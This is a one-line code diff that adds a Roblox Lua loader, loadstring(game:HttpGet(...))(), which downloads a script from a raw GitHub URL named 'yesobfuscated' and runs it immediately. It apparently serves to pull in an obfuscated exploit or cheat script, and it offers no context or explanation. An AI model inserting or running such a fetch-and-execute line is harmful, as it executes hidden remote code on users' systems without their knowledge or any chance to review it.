@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Wafflew2/h/main/yesobfuscated", true))()
